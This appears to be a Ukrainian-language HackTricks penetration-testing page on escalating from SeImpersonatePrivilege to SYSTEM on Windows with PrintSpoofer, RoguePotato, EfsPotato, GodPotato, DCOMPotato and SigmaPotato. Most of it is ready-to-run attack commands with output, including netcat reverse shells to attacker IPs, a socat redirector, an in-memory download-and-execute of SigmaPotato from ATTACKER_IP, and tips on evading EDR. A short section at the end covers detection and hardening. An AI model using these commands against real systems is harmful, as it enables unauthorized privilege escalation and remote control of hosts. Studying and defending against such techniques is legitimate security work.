# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato не працює** на Windows Server 2019 і Windows 10 build 1809 та новіших версіях. Однак [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** можуть бути використані для отримання тих же привілеїв і підвищення до рівня доступу `NT AUTHORITY\SYSTEM`. Цей [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) детально описує інструмент `PrintSpoofer`, який можна використовувати для зловживання impersonation privileges на хостах Windows 10 і Server 2019, де JuicyPotato більше не працює.

> [!TIP]
> Сучасна альтернатива, яка регулярно підтримується у 2024–2025, — SigmaPotato (форк GodPotato), який додає in-memory/.NET reflection використання та розширену підтримку ОС. Див. швидке використання нижче та репо в References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Вимоги та поширені підводні камені

Всі наступні техніки залежать від зловживання привілейованою службою, яка підтримує impersonation, з контексту, що має один із цих привілеїв:

- SeImpersonatePrivilege (найпоширеніший) або SeAssignPrimaryTokenPrivilege
- Високий рівень цілісності не потрібен, якщо токен вже має SeImpersonatePrivilege (типово для багатьох сервісних акаунтів, таких як IIS AppPool, MSSQL тощо)

Швидко перевірте привілеї:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- PrintSpoofer потребує, щоб сервіс Print Spooler був запущений і доступний через локальний RPC-ендпоінт (spoolss). У захищених середовищах, де Spooler вимкнено після PrintNightmare, віддавайте перевагу RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato вимагає OXID resolver, доступного на TCP/135. Якщо egress заблоковано, використовуйте redirector/port-forwarder (див. приклад нижче). Старіші збірки вимагали прапорця -f.
- EfsPotato/SharpEfsPotato зловживають MS-EFSR; якщо один pipe заблоковано, спробуйте альтернативні pipe (lsarpc, efsrpc, samr, lsass, netlogon).
- Помилка 0x6d3 під час RpcBindingSetAuthInfo зазвичай вказує на невідомий/непідтримуваний RPC authentication service; спробуйте інший pipe/transport або переконайтеся, що цільовий сервіс запущено.

## Швидке демо

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Примітки:
- Ви можете використовувати -i, щоб створити інтерактивний процес у поточній консолі, або -c, щоб виконати однорядкову команду.
- Потребує службу Spooler. Якщо вона відключена, це не спрацює.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Якщо outbound 135 заблоковано, перенаправте OXID resolver через socat на вашому redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Порада: Якщо один pipe не спрацьовує або EDR його блокує, спробуйте інші підтримувані pipe:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Примітки:
- Працює на Windows 8/8.1–11 та Server 2012–2022 за наявності SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato надає два варіанти, що націлені на DCOM-об'єкти служби, які за замовчуванням використовують RPC_C_IMP_LEVEL_IMPERSONATE. Зберіть або використайте надані бінарні файли та запустіть вашу команду:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato додає сучасні зручності, такі як in-memory execution через .NET reflection та PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Примітки щодо виявлення та захисту

- Моніторьте процеси, які створюють іменовані пайпи та одразу викликають token-duplication APIs, а потім CreateProcessAsUser/CreateProcessWithTokenW. Sysmon може надати корисну телеметрію: Event ID 1 (створення процесу), 17/18 (іменований пайп створено/підключено) та командні рядки, що породжують дочірні процеси від імені SYSTEM.
- Spooler hardening: Вимкнення служби Print Spooler на серверах, де вона не потрібна, перешкоджає атакам на локальне підвищення привілеїв у стилі PrintSpoofer через spoolss.
- Service account hardening: Мінімізуйте призначення SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege кастомним сервісам. Розгляньте запуск сервісів під віртуальними обліковими записами з мінімально необхідними привілеями та ізоляцією за допомогою service SID і токенів з обмеженням на запис, коли це можливо.
- Network controls: Блокування вихідних TCP/135 або обмеження трафіку RPC endpoint mapper може зламати RoguePotato, якщо не доступний внутрішній редиректор.
- EDR/AV: Всі ці інструменти широко підписані сигнатурами. Перекомпіляція з вихідників, перейменування символів/рядків або виконання в пам'яті може знизити виявлення, але не обійде надійні поведінкові детекції.

## Джерела

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
